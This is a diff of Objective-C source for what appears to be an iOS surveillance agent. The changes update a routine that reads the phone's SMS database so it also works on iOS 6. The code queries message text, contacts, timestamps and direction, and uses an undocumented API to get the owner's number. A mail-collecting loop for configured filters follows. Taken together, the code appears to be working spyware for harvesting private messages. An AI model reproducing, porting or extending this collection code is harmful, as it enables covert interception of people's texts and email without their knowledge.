@@ -281,6 +281,8 @@ static void MsgNotificationCallback (CFNotificationCenterRef center,
         }
     }
    
+  [agentDict release];
+  
   [outerPool release];
   
   return YES;
@@ -826,7 +828,7 @@ static void MsgNotificationCallback (CFNotificationCenterRef center,
   return YES;
 }
 
-- (BOOL)_smsWithKeyWords: (NSArray *)keyWords 
+- (BOOL)_smsWithKeyWords: (NSArray *)keyWords
               withFilter: (int)msgFilter 
                 fromDate: (long)fromDate 
                   toDate: (long)toDate
@@ -841,33 +843,46 @@ static void MsgNotificationCallback (CFNotificationCenterRef center,
   NSString      *subject;
   NSString      *to;
   time_t        unixTime,curr_rowid;
-  char          sql_query_all[] = "select date,address,text,flags,ROWID from message";
+  char          sql_query_all_ios3[] = "select date,address,text,flags,ROWID from message";
+  char          sql_query_all_ios6[] = "select message.date,chat.chat_identifier, message.text, message.is_from_me,message.rowid from message inner join chat_message_join on chat_message_join.message_id = message.rowid inner join chat on chat_message_join.chat_id = chat.rowid";
   char          sql_db_name[] = SMS_DB_IPHONE_OS;
+  char          *sql_query_all = sql_query_all_ios3;
 
   NSRange range;
   BOOL bFound = YES;
   
+  if (gOSMajor >= 6)
+    sql_query_all = sql_query_all_ios6;
+
   if (msgFilter == COLLECT_FILTER_TYPE) 
     {
       // Setting last sms datetime
       if (fromDate > ALL_MSG)
         {
-          sprintf(sql_query_curr, "%s where date > %ld", sql_query_all, fromDate);
+          long _fdate = fromDate;
+          long _todate = toDate;
+          
+          if (gOSMajor >= 6 && fromDate > 0)
+            _fdate -= NSTimeIntervalSince1970;
+          if (gOSMajor >= 6 && toDate > 0)
+            _todate -= NSTimeIntervalSince1970;
+          
+          sprintf(sql_query_curr, "%s where message.date >= %ld", sql_query_all, _fdate);
           if (toDate > ALL_MSG)
-            sprintf(sql_query_curr, "%s and date < %ld", sql_query_curr, toDate);
+            sprintf(sql_query_curr, "%s and message.date < %ld", sql_query_curr, _todate);
         }
       else 
         sprintf(sql_query_curr, "%s", sql_query_all);
     }
   else 
     {
-      sprintf(sql_query_curr, 
-              "select date,address,text,flags,ROWID from message where ROWID > %ld", 
-              fromDate);
+      //sprintf(sql_query_curr, "select date,address,text,flags,ROWID from message where ROWID > %ld", fromDate);
+      sprintf(sql_query_curr, "%s where message.ROWID > %ld", sql_query_all, fromDate);
     }
  
   if (sqlite3_open(sql_db_name, &db))
     {
+      sqlite3_close(db);
       return NO;
     }
   
@@ -960,26 +975,35 @@ static void MsgNotificationCallback (CFNotificationCenterRef center,
           // flags == 2 -> in mesg; flags == 3 -> out mesg
           flags = 0;
           sscanf(result[ncol + i + 3], "%d", &flags);
-          
-          // from_field/to_field
-          if (flags == IN_SMS) 
+   
+          switch (flags)
+          {
+            case IN_SMS:
+            case 0:
             {
               from = [NSString stringWithCString: result[ncol + i + 1] encoding: NSUTF8StringEncoding];
               // undocumented
               to   = CTSettingCopyMyPhoneNumber();
               // not set
-              if (to == nil) 
+              if (to == nil)
                 to = [NSString stringWithCString: "local" encoding: NSUTF8StringEncoding];
+              break;
             }
-          else 
+            case OUT_SMS:
+            case 1:
             {
               to = [NSString stringWithCString: result[ncol + i + 1] encoding: NSUTF8StringEncoding];
               // undocumented
               from = CTSettingCopyMyPhoneNumber();
               // not set
-              if (from == nil) 
+              if (from == nil)
                 from = [NSString stringWithCString: "local" encoding: NSUTF8StringEncoding];
+              
+              break;
             }
+            default:
+              break;
+          }
           
           // unixtime to filetime for datetime_field
           int64_t  filetime = ((int64_t)unixTime * (int64_t)RATE_DIFF) + (int64_t)EPOCH_DIFF;
@@ -1047,13 +1071,13 @@ static void MsgNotificationCallback (CFNotificationCenterRef center,
   enumeratorCfg = [[[mMessageFilters copy] autorelease] objectEnumerator];
   
   // Loop on filters...
-  while (anObject = [enumeratorCfg nextObject]) 
+  while (anObject = [enumeratorCfg nextObject])
     {
       [anObject retain];
     
       if([[anObject objectForKey: @"filterType"] intValue]  == msgFilter &&
          [[anObject objectForKey: @"messageType"] intValue] == MAIL_TYPE)
-        {    
+        {
           long maxMsgSize = [[anObject objectForKey: @"maxMessageSize"] longValue];
 
           if (msgFilter == COLLECT_FILTER_TYPE)
@@ -1062,12 +1086,12 @@ static void MsgNotificationCallback (CFNotificationCenterRef center,
               long toDate     = [[anObject objectForKey: @"toDate"] longValue];
             
               if ((mFirstCollectorMail != fromDate && fromDate > ALL_MSG) ||
-                  mLastCollectorMail   != toDate) 
+                  mLastCollectorMail   != toDate)
                 {
                   mFirstCollectorMail = fromDate;
                   mLastCollectorMail  = toDate;
                 
-                  [self _mailWithMessageSize: maxMsgSize 
+                  [self _mailWithMessageSize: maxMsgSize
                                   withFilter: msgFilter 
                                     fromDate: mFirstCollectorMail
                                       toDate: mLastCollectorMail];
